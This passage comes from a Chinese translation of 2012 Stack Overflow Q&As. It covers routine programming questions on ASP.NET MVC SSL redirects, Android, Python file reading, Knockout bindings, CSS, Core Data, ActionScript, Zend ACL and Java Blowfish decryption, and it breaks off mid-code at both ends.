using namespace std;

vector<string> SplitString (string aString);
vector<string> SplitString (string aString){
  vector<string> vec;
  char * cstr, *p;
  string str = aString;

  cstr = new char [str.size()+1];
  strcpy (cstr, str.c_str());
  p=strtok (cstr," ");

  while (p!=NULL){
   vec.push_back(p);
   p = strtok(NULL," ");
  }

  delete[] cstr;
  return vec;
}

int main(){

  map<string,string> m;
  m["..."] = "S";
  m["---"] = "0";

  vector<string> v;
  string sentence = "... --- ...";
  v = SplitString(sentence);

  vector<string>::iterator it;

  cout << "Our morse (" << sentence << ") decoded to: ";
  for ( it = v.begin() ; it < v.end(); it++ ){
    cout << m[*it];
  }

  cout << endl;

  return 0;
} 
```

你可以填写其他的莫尔斯电码，会占用我太多时间，抱歉，使用 SOS，因为它是如此知名。:) 这个例子也可能不是很好，也不是优化也不推荐，自从我接近 c++ 已经好几年了。希望它在你身上激发一些更好的想法。

# asp.net-mvc - 如何仅为登录和特定页面激活 SSL MVC

> ID：10772922
> 
> 赞同：3
> 
> 时间：2012-05-27T09:23:24.360
> 
> 标签：asp.net-mvc, asp.net-mvc-4, ssl, https, forms-authentication

我有一个 MVC 4 Web 应用程序，我需要 SSL 来执行一组特定的操作，现在我希望登录过程也受 SSL 保护。

设置完所有内容后，由于登录页面的 redirectToUrl 参数未指定架构，所有需要登录的页面都会重定向到 https，**无论**`[RequireHttps]`我在行动。

 **由于我没有用 RequireHttps 属性修饰的页面托管混合内容，这会触发通常的浏览器警告，这会让用户感到困惑，我想避免。

有没有办法解决这个问题？我想从登录操作中获取架构，但是除了 returnUrl 参数（它只是一个相对路径）之外，我找不到对原始请求的引用。

我在 SO 中找到的参考是[创建一个自定义属性](https://stackoverflow.com/a/2513300/1376513)来装饰每个不需要 https 的操作，但是还有什么比这更干燥的吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-27T09:35:25.057

我发现以下内容很有用，而不是使用 [RequireHttps] 进行装饰，而是使用 [Secure] 进行装饰，然后此属性为我工作。

```
using System;
using System.Collections.Generic;
using System.Linq;
using System.Web;
using System.Web.Mvc;

namespace MyNameSpace.Attributes
{
    public class SecureAttribute : ActionFilterAttribute
    {
        #region Variables and Properties
        public bool PermanentRedirect { get; set; }
        #endregion

        #region Public Methods
        public override void OnActionExecuting(ActionExecutingContext filterContext)
        {
            // Cache for efficiency
            var request = filterContext.HttpContext.Request;
            var response = filterContext.HttpContext.Response;

            // Make sure we're not in https or local
            if (!request.IsSecureConnection)
            {
                string redirectUrl = request.Url.ToString().Replace(
                    Uri.UriSchemeHttp,
                    Uri.UriSchemeHttps);

                if (PermanentRedirect)
                {
                    // Set the status code and text description to redirect permanently
                    response.StatusCode = 301;
                    response.StatusDescription = "Moved Permanently";
                }
                else
                {
                    // Set the status code and text description to redirect temporary (found)
                    response.StatusCode = 302;
                    response.StatusDescription = "Found";
                }

                // Add the location header to do the redirect
                response.AddHeader("Location", redirectUrl);
            }

            base.OnActionExecuting(filterContext);
        }
        #endregion
    }
} 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-05-31T18:25:42.113

好吧，我最终选择了我原始帖子评论中描述的解决方案，这被证明是最轻松的方法。

总结一下（代码的所有功劳归功于**Luke Sampsons**，我只是在这里重新发布以供快速参考）这基本上是代码：

```
public class ExitHttpsIfNotRequiredAttribute : FilterAttribute, IAuthorizationFilter
    {
        public void OnAuthorization(AuthorizationContext filterContext)
        {
            // abort if it's not a secure connection
            if (!filterContext.HttpContext.Request.IsSecureConnection) return;

            // abort if a [RequireHttps] attribute is applied to controller or action
            if (filterContext.ActionDescriptor.ControllerDescriptor.GetCustomAttributes(typeof(RequireHttpsAttribute), true).Length > 0) return;
            if (filterContext.ActionDescriptor.GetCustomAttributes(typeof(RequireHttpsAttribute), true).Length > 0) return;

            // abort if a [RetainHttps] attribute is applied to controller or action
            if (filterContext.ActionDescriptor.ControllerDescriptor.GetCustomAttributes(typeof(RetainHttpsAttribute), true).Length > 0) return;
            if (filterContext.ActionDescriptor.GetCustomAttributes(typeof(RetainHttpsAttribute), true).Length > 0) return;

            // abort if it's not a GET request - we don't want to be redirecting on a form post
            if (!String.Equals(filterContext.HttpContext.Request.HttpMethod, "GET", StringComparison.OrdinalIgnoreCase)) return;

            // redirect to HTTP
            string url = "http://" + filterContext.HttpContext.Request.Url.Host + filterContext.HttpContext.Request.RawUrl;
            filterContext.Result = new RedirectResult(url);
        }
    }
    public  class RetainHttpsAttribute:FilterAttribute{} 
```

该`ExitHttpsIfNotRequired`属性可用于装饰用于派生 Web 应用程序中所有控制器的基本控制器类。**

# java - grails 中的谷歌地图插件

> ID：10772928
> 
> 赞同：3
> 
> 时间：2012-05-27T09:24:22.113
> 
> 标签：java, grails

我有兴趣将 google-maps api 与我的 grails 应用程序集成。我一直在寻找一个更舒适的插件，但我在 grails.org/plugins 下没有找到任何东西

我在 github [https://github.com/IntelliGrape/Grails-Google-Map-Plugin](https://github.com/IntelliGrape/Grails-Google-Map-Plugin)上找到了另一个选项，但我试过了，它似乎不适用于 grails 2.0.3

任何人都可以向我推荐另一种选择或替代方案吗？

谢谢大家

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-12T23:11:51.903

请看一下：

*   [http://grails.org/plugin/richui#Map](http://grails.org/plugin/richui#Map)
*   [http://www.ibm.com/developerworks/java/library/j-grails05208/index.html](http://www.ibm.com/developerworks/java/library/j-grails05208/index.html)
*   [http://www.componentix.com/blog/2/twitter-and-google-maps-mashup-in-minutes-with-grails](http://www.componentix.com/blog/2/twitter-and-google-maps-mashup-in-minutes-with-grails)

# xcode - 故事板中的 UIBarButtonItem

> ID：10772939
> 
> 赞同：1
> 
> 时间：2012-05-27T09:27:15.030
> 
> 标签：xcode, view, storyboard

使用 Storyboard 时包含的主详细信息应用程序在视图中确实加载了此代码。

```
UIBarButtonItem *addButton = [[UIBarButtonItem alloc] initWithBarButtonSystemItem:UIBarButtonSystemItemAdd target:self action:@selector(insertNewObject:)]; 
```

我想在与 .xib'S 相同的项目中使用它

```
UIBarButtonItem *addButton = [[UIBarButtonItem alloc] initWithBarButtonSystemItem:UIBarButtonSystemItemAdd target:self action:@selector(showGegenstellenView)]; 
```

问题是我无法在情节提要项目中实现此代码。我找不到故事板的特殊帮助...

```
-(void)showGegenstellenView{
GegenstellenViewController *gegenstellenViewController = [[GegenstellenViewController alloc]initWithMasterController:self Gegenstellen:nil];
[self presentModalViewController:gegenstellenViewController animated:YES]; 
```

}

最后我想在表格视图中单击添加按钮，并且视图带有一个公式。所有这些都适用于我拥有的 xib 项目。但我想要故事板！当您想通过团队查看器或通过邮件查看 xib 项目时，我没有问题。

最好的问候约翰

# android - 怎么知道尾部吐司的数量

> ID：10772940
> 
> 赞同：0
> 
> 时间：2012-05-27T09:27:58.663
> 
> 标签：android, message, toast

我想知道如何获取将显示为 Toast 的消息列表。当有几个问题破坏了某些显示的持续时间时。谢谢 ！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-27T10:12:49.587

这不可能。因为 Toast que 归 android-VM 所有。您可以推送新的 toast 或取消现有的 toast（如果您有其引用对象），但不能计算总数或取消全部。阅读[这个](https://stackoverflow.com/a/2755436/966550)和[这个](http://developer.android.com/reference/android/widget/Toast.html#cancel%28%29)

# android - 在活动之间传递实时信息

> ID：10772941
> 
> 赞同：0
> 
> 时间：2012-05-27T09:28:23.720
> 
> 标签：android, google-maps

我的 Android 项目中有两个活动：

1.  谷歌地图活动
2.  列出活动

我正在尝试将项目的位置信息传递给 GMAP Activity 并将其作为叠加层添加到地图中。我知道我必须使用 putExtra 和 getExtra 但我想将该位置添加到 Google 地图并在用户点击列表活动项目时将其显示给用户。我怎样才能做到这一点？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-27T09:34:02.913

您可以使用 ListView 的 setOnItemClickListener，并在此方法的实现中启动一个新的 GMAP。以下是示例代码：

```
listView.setOnItemClickListener(new AdapterView.OnItemClickListener() {
    public void onItemClick(AdapterView parent, View v, int position, long id){
        // Start your Activity according to the item just clicked.
        //also put extras.
        Intent newIntent = new Intent(ListActivity.this, GMAPActivity.class);
        newIntent.putExtra(key,value);
        startActivity(newIntent);
    }
}; 
```

# image - 获取存储在 Amazon S3 上的图像的图像高度和宽度

> ID：10772942
> 
> 赞同：15
> 
> 时间：2012-05-27T09:28:25.183
> 
> 标签：image, amazon-s3, information-retrieval

我计划将图像存储在 Amazon S3 上，如何从 Amazon S3 中检索：

*   文件大小
*   图像高度
*   图像宽度？

* * *

## 回答 #1

> 赞同：33
> 
> 时间：2013-11-27T15:58:52.603

您可以在上传图像时将图像尺寸存储在用户定义的元数据中，然后使用 REST API 读取此数据。

有关用户定义的元数据的更多信息，请参阅此页面：http: [//docs.aws.amazon.com/AmazonS3/latest/dev/UsingMetadata.html](http://docs.aws.amazon.com/AmazonS3/latest/dev/UsingMetadata.html)

* * *

## 回答 #2

> 赞同：14
> 
> 时间：2012-05-27T09:32:42.643

通过读取对文件的简单请求的`Content-Length`响应标头，可以获取文件大小。`HEAD`也许您的客户可以帮助您完成此查询。[有关S3 API 文档](http://docs.amazonwebservices.com/AmazonS3/2006-03-01/API/RESTObjectHEAD.html)的更多信息。

Amazon S3 只是为您提供存储，（几乎）仅此而已。无法通过 API 访问图像尺寸。您必须获取整个文件，并自己计算其尺寸。如果适用，我建议您在将文件上传到 S3 时将此信息存储在数据库中。

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2019-09-24T02:29:17.453

[在 Node 上，使用image-size](https://www.npmjs.com/package/image-size)和[node-fetch](https://www.npmjs.com/package/node-fetch)非常容易。

```
async function getSize(imageUrl) {
  const response = await fetch(imageUrl);
  const buffer = await response.buffer();
  return imageSize(buffer);
} 
```

# javascript - 与 Knockout 框架的组合框绑定不正确

> ID：10772943
> 
> 赞同：0
> 
> 时间：2012-05-27T09:28:40.443
> 
> 标签：javascript, binding, knockout.js

大家好

我用表格创建了简单的页面，并希望使用敲除框架用数据填充它。

该表包含三列，显示来自底层 viewModel 的数据。通常这是可行的，但我对第一列（允许选择当前项目的组合框）有一点问题：我想将“数字”属性显示为组合标题并在绑定中指定属性名称，但显示值“[对象对象]”代替数属性。

那么，我的绑定有什么问题。如何正确显示“数字”属性？

谢谢你。

页面代码在这里：

```
<head>
<script src="http://cloud.github.com/downloads/SteveSanderson/knockout/knockout-2.1.0.js" type="text/javascript"></script>
</head>
<body>
<button data-bind="click: addItem">Add product</button>

    <table>
        <thead>
            <tr>
                <th>Number</th>
                <th>Name</th>
                <th>Count</th>
            </tr>
        </thead>
        <tbody data-bind="foreach: itemsData">
            <tr>
                <td>
                    <select data-bind="options: $root.avaliableItems, optionsText: $data.number, optionsCaption: 'Select...', value: tableItem"> </select>
                </td>
                <td data-bind="with: tableItem">
                    <span data-bind="text: name"> </span>
                </td>
                <td>
                    <input data-bind="value: count" />
                </td>
            </tr>
        </tbody>
    </table>

    <script type="text/javascript">
        function TableItem(number, name){
            var self = this;
            self.number = ko.observable(number);
            self.name = ko.observable(name);
        };

        function ExtendedItem(){
            var self = this;
            self.tableItem = ko.observable();
            self.count = ko.observable(1);
        };

        function SampleViewModel(){
            var self = this;
            self.avaliableItems = [
                new TableItem("Num1", "Item 1 name"),
                new TableItem("Num2", "Item 2 name"),
                new TableItem("Num3", "Item 3 name"),
                new TableItem("Num4", "Item 4 name"),
                new TableItem("Num5", "Item 5 name"),
                new TableItem("Num6", "Item 6 name"),
                new TableItem("Num7", "Item 7 name")
            ];

            self.itemsData = ko.observableArray();

            self.addItem = function(){
                self.itemsData.push(new ExtendedItem());
            };
        };
        ko.applyBindings(new SampleViewModel());
    </script>
</body> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-27T10:08:04.217

您的选择应如下所示：

```
<select data-bind="options: $root.avaliableItems, optionsText: 'number', optionsCaption: 'Select...', value: tableItem"> </select> 
```

注意 的使用`optionsText`，它接受一个字符串（标识属性名称）。

这是一个演示的小提琴：http: [//jsfiddle.net/jearles/5qakM/](http://jsfiddle.net/jearles/5qakM/)

阅读[选项绑定文档](http://knockoutjs.com/documentation/options-binding.html)以获取更多详细信息。

# android - 类似感觉的上下文菜单？

> ID：10772944
> 
> 赞同：0
> 
> 时间：2012-05-27T09:28:50.600
> 
> 标签：android, android-contextmenu, sense

我注意到一些程序使用弹出工具栏作为上下文菜单而不是实际的上下文菜单，例如在 Sense 中（见图 :)

![在此处输入图像描述](../Images/b8caabc0a398e9ac6e43bfec4acbbd30.png)

我将如何实施这样的事情？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-27T09:42:56.167

它被称为快速操作弹出窗口，您必须自己创建它。

请参阅此[链接](http://www.londatiga.net/it/how-to-create-quickaction-dialog-in-android/)。

示例代码片段::

```
//Add action item
ActionItem addAction = new ActionItem();
addAction.setTitle("Add");
addAction.setIcon(getResources().getDrawable(R.drawable.ic_add));

//Accept action item
ActionItem accAction = new ActionItem();

accAction.setTitle("Accept");
accAction.setIcon(getResources().getDrawable(R.drawable.ic_accept));

//Upload action item
ActionItem upAction = new ActionItem();
upAction.setTitle("Upload");
upAction.setIcon(getResources().getDrawable(R.drawable.ic_up)); 
```

创建快速操作实例并设置监听器

```
final QuickAction mQuickAction  = new QuickAction(this);

mQuickAction.addActionItem(addAction);
mQuickAction.addActionItem(accAction);
mQuickAction.addActionItem(upAction);

//setup the action item click listener
mQuickAction.setOnActionItemClickListener(new QuickAction.OnActionItemClickListener() {
    @Override
        public void onItemClick(int pos) {
        if (pos == 0) { //Add item selected
           Toast.makeText(Example1Activity.this, "Add item selected", Toast.LENGTH_SHORT).show();
        } else if (pos == 1) { //Accept item selected
           Toast.makeText(Example1Activity.this, "Accept item selected", Toast.LENGTH_SHORT).show();
        } else if (pos == 2) { //Upload item selected
           Toast.makeText(Example1Activity.this, "Upload items selected", Toast.LENGTH_SHORT).show();
        }
    }
}); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-27T10:30:40.043

这些链接完全符合您的需求，顺便说一下，这个弹出工具被称为 QuickAction：

[快速行动](https://github.com/lorensiuswlt/NewQuickAction3D)

[快速操作对话框](http://www.londatiga.net/it/how-to-create-quickaction-dialog-in-android/)

[绿色机器人 QuickAction](http://android.cyrilmottier.com/?p=347)

![QuickActionBar 和 GridAction](../Images/f1476872e3cdb3ff2315a9e4b7cd8295.png)

希望对你有帮助

# python - 尝试第二次读取打开的文件没有数据

> ID：10772947
> 
> 赞同：3
> 
> 时间：2012-05-27T09:29:49.443
> 
> 标签：python

```
fin = open('/abc/xyz/test.txt', 'a+')

def lst():
  return fin.read().splitlines()

print lst()

def foo(in):
  print lst()
  fin.write(str(len(lst()) + in)
  fin.flush() 
```

在上面的代码中，当`print lst()`在函数外部调用时，它会给出正确的结果，但是当尝试在函数中调用相同的函数时，`foo()`它会产生空列表，其`len(lst())`值为 0。我还尝试通过注释最后两行，但它仍然返回空列表。上面的代码有什么问题？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-05-27T09:32:04.927

文件对象应该被读取一次。一旦`fin`已经`read()`到达，您就不能再从文件中读取任何其他内容，因为它已经到达`EOF`。

> 要读取文件的内容，请调用 f.read(size)，它会读取一定数量的数据并将其作为字符串返回。size 是一个可选的数字参数。当 size 省略或为负时，将读取并返回文件的全部内容；如果文件是机器内存的两倍，那是你的问题。否则，最多读取并返回 size 个字节。如果已到达文件末尾，f.read() 将返回一个空字符串 ("")。

[http://docs.python.org/tutorial/inputoutput.html#methods-of-file-objects](http://docs.python.org/tutorial/inputoutput.html#methods-of-file-objects)

如果您确实需要可重入访问您的文件，请使用：

```
def lst():
  fin.seek(0)
  return fin.readlines() 
```

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-05-27T09:35:51.177

将完整的文件读入内存后，从该文件中读取更多内容将导致返回一个空字符串：

```
>>> example = open('foobar.txt')
>>> example.read()
'Foo Bar\n'
>>> example.read()
'' 
```

换句话说，您已经到达文件的末尾。您在这里有三个选择：

1.  每次完整读取时重新打开文件。
2.  使用[`.seek()`](http://docs.python.org/library/stdtypes.html#file.seek)再次转到文件的开头：

    ```
    >>> example = open('foobar.txt')
    >>> example.read()
    'Foo Bar\n'
    >>> example.seek(0)
    >>> example.read()
    'Foo Bar\n' 
    ```

3.  将文件的内容存储在变量中，从而将其缓存在内存中，然后使用它而不是重新读取文件。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-05-27T09:33:24.990

[**`read()`**](http://docs.python.org/library/stdtypes.html#file.read)一旦你打过电话，`fin`就已经读过了。

如果您想`read()`再次使用它（在第一次尝试时丢弃了内容），您需要重新[**`open()`**](http://docs.python.org/library/functions.html#open)或[**`seek()`**](http://docs.python.org/library/stdtypes.html#file.seek)文件的开头。

我建议您在 中执行此操作`lst()`，或者更好的是，将返回的内容存储在`lst()`

除此之外...

```
fin.write(str(len(lst()) + in) 
```

目前尚不清楚您要在这里做什么，但是最好使用存储的返回值 from`lst()`而不是`in`用作变量名，因为它是一个保留[*关键字*](http://docs.python.org/reference/lexical_analysis.html#keywords)。

就像是：

```
lines = lst()
# [...]
number_of_lines = len(lines)
fin.write(str(number_of_lines) + some_other_str) 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-05-27T11:58:59.573

文件对象只能**读取一次**，这意味着如果`fin.read()`您在后面的 fin.read() 之前调用过，则不会返回任何内容。

`fin.seek(0)`通过调用 fin.read() 后调用来修复此问题，或将文件读取到某个缓冲区。

# core-animation - NSTableColumn 动画

> ID：10772953
> 
> 赞同：1
> 
> 时间：2012-05-27T09:31:02.170
> 
> 标签：core-animation, nstableview, nstablecolumn

我想用动态列制作一个表格视图。类似于[Ecoute中的那个](http://www.pixiapps.com/ecouteosx/images/screens/globalView-large.jpg)

我只需要一次可见一列。双击它后，整个表格视图（不是滚动视图）应该向左移动，并且应该出现新列。

我不知道如何实现它。

有人有想法吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-10T21:32:28.433

刚刚添加了一个新的 NavigationViewController，它处理多个处理表格视图的 TableViewController。NavigationViewController 然后在它们之间进行动画处理。

如果你有这个想法，这实际上很简单。

# image - Drupal 7 相对图像路径以模块名称为前缀

> ID：10772959
> 
> 赞同：0
> 
> 时间：2012-05-27T09:32:08.653
> 
> 标签：image, drupal

我为 Drupal 7 编写了一个在 localhost 上运行良好的模块。

当我上传模块时，模块的每个图像的路径都与 localhost 不同：它们以语言 (fr/) 为前缀，然后以模块的名称 (在我的情况下为 agilitag/)

所以图片的链接被破坏了，因为我有完整的路径 [http://www.agilitag.com/fr/agilitag/sites/all/modules/agilitag/images/edit.png](http://www.agilitag.com/fr/agilitag/sites/all/modules/agilitag/images/edit.png) 代替 [http://www。 aglitag.com/sites/all/modules/agilitag/images/edit.png](http://www.agilitag.com/sites/all/modules/agilitag/images/edit.png)

我在互联网上找不到如何正确删除或调整图像的路径

感谢您的帮助！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-02T09:20:17.557

我在每个相对链接之前添加了一个“/”，并且它与激活的干净 url 一起工作

# css - 背景图片只显示一次

> ID：10772966
> 
> 赞同：0
> 
> 时间：2012-05-27T09:33:55.383
> 
> 标签：css, html, background-image, repeat

我有一个奇怪的问题，我无法理解：

我有一个标题 div，我想显示一个水平重复的背景图像：

的HTML：

```
<div id="headerwrapper">

     <div id="header">
          <p>This is an extremely interesting test. This is an extremely interesting test. This is an extremely interesting test.</p>
     </div>

</div> 
```

这是CSS：

```
* {
    margin:0;
    padding:0;
}

#headerwrapper {
    margin:0 auto;
    width:630px;    
}

#header {
    width:630px;
    background-image:url(../images/headermiddleback.jpg);
    background-repeat:repeat-x;
} 
```

当我在浏览器中查看它时，我只能看到文本上方显示的背景图像的 1 个实例。但它没有重复。

知道我在这里做错了什么吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-27T09:42:03.763

这是您在 jsFiddle 上的示例，似乎可以正常工作。 [http://jsfiddle.net/MgvLT/1/](http://jsfiddle.net/MgvLT/1/)

也许你有一些其他的 CSS 进入了方式，或者你的背景图像有很多空白空间。请在 jsFiddle 上发布您的示例。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-27T09:44:48.267

也许您需要**清除**浏览器**缓存**？

例如，这是一个[SO Post](https://stackoverflow.com/a/7000899/1195891)，展示了如何为 Chrome 执行此操作。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-27T10:32:32.860

您可能想使用`repeat-y`而不是`repeat-x`

```
#header {
    width:630px;
    background-image:url(http://dl.dropbox.com/u/4457768/css/headermiddleback.jpg);
    background-repeat:repeat-y;
} 
```

# objective-c - 核心数据 - 获取具有可选属性的对象

> ID：10772969
> 
> 赞同：2
> 
> 时间：2012-05-27T09:34:15.410
> 
> 标签：objective-c, core-data

我有`EntityA`一个可选属性 int32 `result`。当我创建时，`EntityA`我没有设置`result`属性。然后稍后当我获取它时，我希望它具有`nil`价值，但由于某种原因，`3`即使我没有设置此属性，它也被设置为。

这里发生了什么？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-27T10:13:09.770

*第一个可能的问题：*
您在模型编辑器中设置了默认值。选择属性并检查检查器。

*第二个可能的问题：*
您正在检索或显示错误的值。显示您正在使用的代码以找出结果为“3”。

*第三个可能的问题：*
您稍后无意中设置了值，可能是在循环或类似的情况下。对属性进行文本搜索以查找代码中可能出现的情况。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-27T09:52:56.303

您的 int32 将存储在一个 NSNumber 对象中。如果您不提供值，则不会创建 NSNumber 对象 - sql 会将其视为 NULL。

iOS 核心数据编程指南说：

> 您可以指定一个属性是可选的——也就是说，它不需要有一个值。但是，通常不鼓励您这样做，尤其是对于数值（通常，您可以使用具有默认值（在模型中）为 0 的强制属性获得更好的结果）。原因是 SQL 对 NULL 有特殊的比较行为，这与 Objective-C 的 nil 不同。数据库中的 NULL 与 0 不同，搜索 0 将不会匹配具有 NULL 的列。

因此，最好将属性设为强制并将其设置为不同的值，或者从一开始就传入 NSNumber。

# actionscript-3 - 如何删除这个不相关的代码块，它检查容器中孩子的可用性

> ID：10772972
> 
> 赞同：0
> 
> 时间：2012-05-27T09:34:25.130
> 
> 标签：actionscript-3, flash, apache-flex

这是我点击按钮的代码。它将 myView 添加到容器中。并注意在再次添加之前删除所有先前的实例。我想知道，是否有更好的方法来做这个“检查”？我特别想有一些方法来删除这段代码的 1s 7 行（在评论中）。它似乎是正常代码流中不相关的代码块。

```
function button_CLICK(e:Event)
{
///////////////////////////////////////////////////
            if ( myView!= null)
            {
                if ( contains(myView))
                {
                    removeChild(myView) ;
                }
            }
/////////////////////////////////////////////////////
            myView = new myView("hello")
            addChild(myView);

} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-27T10:18:30.973

您拥有的检查代码可能会造成内存泄漏，因为在创建新实例之前您不会将之前的 myView 设为空。注意。最好以大写字母开头类的名称。

您的代码似乎还允许在添加 myView 时调用 button_CLICK 方法。也许考虑在添加视图后隐藏按钮。

您可以只实例化 MyView 类的一个实例。然后，不必每次都为 null 并创建一个新实例，只需添加相同的实例并添加一个将接受初始化参数的 init 函数。例如

```
var myView = new MyView();

function button_CLICK(e:Event)
{
if ( contains(myView))
{
removeChild(myView) ;
}
}
myView.init("hello");
addChild(myView);

} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-27T18:17:34.220

这将取决于对象`myView`由什么组成。例如，如果它有自己的事件侦听器，您可能希望在处理对象之前使用条件检查来清理对象，以免内存泄漏。

```
function button_CLICK(e:Event):void
{
    if (myView && contains(myView))
    {
        //clean up myView

        removeChild(myView);
    }

    myView = new myView("hello");
    addChild(myView);
} 
```

但是，如果`myView`是一个简单的显示对象，它不包含任何可泄漏的引用或事件侦听器，那么您可以简单地重新分配变量以覆盖以前的变量。

请记住，`addChild()`将添加的显示对象置于所有其他对象之上。但无论您是否想避免这种情况，我相信最好分配一次默认或空视图，而不是`addChild(myView)`每次单击按钮时。

```
function button_CLICK(e:Event):void
{
    myView = new myView("hello");
} 
```

我假设您的代码用于演示，因为`new myView("hello")`将始终是同一个对象？除非这个对象可能依赖日期或计时器来使实例与以前的构造不同。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-28T02:03:08.503

基于 DisplayObjectContainer 的（IMO）有缺陷的实现，我认为您没有太多选择。如果您感觉很生气，您可以在调用 super 方法之前“修复” removeChild 以查看孩子是否存在，而不是像 Adob​​e 认为的那样简单地抛出错误是合适的解决方案。

您上面的代码仍将运行，但它将位于 removeChild 覆盖中。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-05-28T07:55:58.957

您注释的代码块仅在第一次调用时是必需的`button_CLICK`（您应该重命名此方法：）`buttonClick`。在第一次调用之后，这组代码是不必要的。为了删除这个代码`myView`不应该，并且应该在显示列表中添加`null`一个实例。`MyView`

```
var myView : MyView;

function init(){
   myView = new MyView("FAKE");
   myView.visible = false;
   addChild(myView);
   addEventListener("click",click);
}

function click(e:MouseEvent):void{
   removeChild(myView);
   myView = new Child("REAL");
   addChild(myView);
} 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-05-28T08:07:52.327

尝试：

```
if(myView != null)
    myView.parent && myView.parent.removeChild(myView); 
```

# zend-framework - 使用 ACL 隐藏和显示导航器菜单项、按钮和锚点

> ID：10772973
> 
> 赞同：0
> 
> 时间：2012-05-27T09:34:29.737
> 
> 标签：zend-framework, resources, acl, role

我正在使用 ACL 向系统中的角色授予资源，执行允许的操作并将拒绝的操作路由到自定义页面，我想在运行时使用 ACL 的资源显示和隐藏菜单元素，并且我想显示和在视图中隐藏锚点、按钮。

我做了一个助手类

```
 class Zend_View_Helper_Permission extends Zend_View_Helper_Abstract
  {
   private $_acl;
    public function hasAccess($role, $action, $controller)
    {
      if (!$this->_acl) {

           $this->_acl = Zend_Registry::get("Acl");
    }

     return $this->_acl->isAllowed($role, $controller, $action);
  }
} 
```

我像这样在 config.ini 文件中定义视图助手

```
resources.view.helperPath.Zend_View_Helper = APPLICATION_PATH "/modules/privileges/views/helpers" 
```

我怎样才能使用这个助手在运行时创建视图？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-27T09:53:14.007

您的方法名称应该与类名称匹配，因此它应该是权限而不是 hasAccess。

我自己使用全局方法 show() 而不是使用视图助手

```
 function show($action = null)
    {

        $request = Zend_Controller_Front::getInstance()->getRequest();
        $action = $action === null ? $request->getActionName() : $action;
        $module = $request->getModuleName();
        $controller = $request->getControllerName();

        if(!Zend_Registry::isRegistered('acl')) throw new Exception('Show function can only be called inside view after preDispatch');

        $acl = Zend_Registry::get('acl');
$resource = $module . '#' . $controller;
        return $acl->isAllowed(Zend_Auth::getInstance()->getIdentity(),$resource,$action);
    } 
```

为了简单起见，它需要控制器，请求对象中的模块名称。要在列表操作视图中隐藏编辑操作链接，只需 doo

list.phtml 代码如下

```
<h2>Listing page Only superadmin can see edit link</h2>
<?php if(show('edit')): ?>
<a href="<?echo $this->url(array('action'=>'edit')) ?>">Edit</a>
<?php endif;?> 
```

更新

全局函数 show 是在 library/Util.php 中定义的，它是在 public/index.php 中加载的

```
require_once 'Zend/Application.php';
require_once 'Util.php'; 
```

# javascript - javascript - 是否可以获得我们在 SYSTEM's timezone 中选择的国家/地区名称。我们可以获得偏移量（如 5.5）但是如何获得国家名称

> ID：10772977
> 
> 赞同：0
> 
> 时间：2012-05-27T09:34:58.937
> 
> 标签：javascript

在 JAVASCRIPT 中，是否可以获得我们在系统中选择的国家名称。例如，如果我的系统时区是“india/kolkata”，我们可以获得如下偏移值：

```
d = new Date()
utc = d.getTime() + (d.getTimezoneOffset()*60000)

offset = (d.getTime()-utc)/3600000 
```

因此 offset 是所需的值，例如 india 的 5.5 。
但我不知道国名。我想通过将偏移量与我的时区数据库中的国家/地区名称进行映射来获取国家/地区名称。但我发现有些国家有相同的时区。例如，印度和斯里兰卡是两个具有相同时区且偏移量为 5.5 的国家。那么，如何从系统的 timezone 获取正确的 javascript 国家名称。

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-27T09:45:50.983

对于客户端 JavaScript，简单的回答：你不能。正如您所说，同一时区可以（并且通常是）多个国家，具有完全相同的偏移量。

我看不到任何其他可靠的方法可以在纯 JavaScript 中获取用户国家/地区。

为什么不简单地询问您的访客？

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-27T09:51:09.047

在支持的地方使用[Geolocation API](http://www.html5rocks.com/en/tutorials/geolocation/trip_meter/)可以帮助您做出“默认”假设，但是仍然强烈建议让用户从国家列表中手动选择他的位置（有些人使用代理）。

# java - Java - 使用河豚加密时缺少最终字符

> ID：10772978
> 
> 赞同：5
> 
> 时间：2012-05-27T09:35:06.973
> 
> 标签：java, encryption, blowfish

我正在使用一些使用 Blowfish 加密文本文件内容的 java 代码。当我将加密文件转换回来（即解密）时，字符串末尾缺少一个字符。任何想法为什么？我对Java非常陌生，并且一直在摆弄这个几个小时而没有运气。

文件war_and_peace.txt 只包含字符串“This is some text”。decrypted.txt 包含“This is some tex”（最后没有 t）。这是java代码：

```
public static void encrypt(String key, InputStream is, OutputStream os) throws Throwable {
    encryptOrDecrypt(key, Cipher.ENCRYPT_MODE, is, os);
}

public static void decrypt(String key, InputStream is, OutputStream os) throws Throwable {
    encryptOrDecrypt(key, Cipher.DECRYPT_MODE, is, os);
}

private static byte[] getBytes(String toGet)
{
    try
    {
        byte[] retVal = new byte[toGet.length()];
        for (int i = 0; i < toGet.length(); i++)
        {
            char anychar = toGet.charAt(i);
            retVal[i] = (byte)anychar;
        }
        return retVal;
    }catch(Exception e)
    {
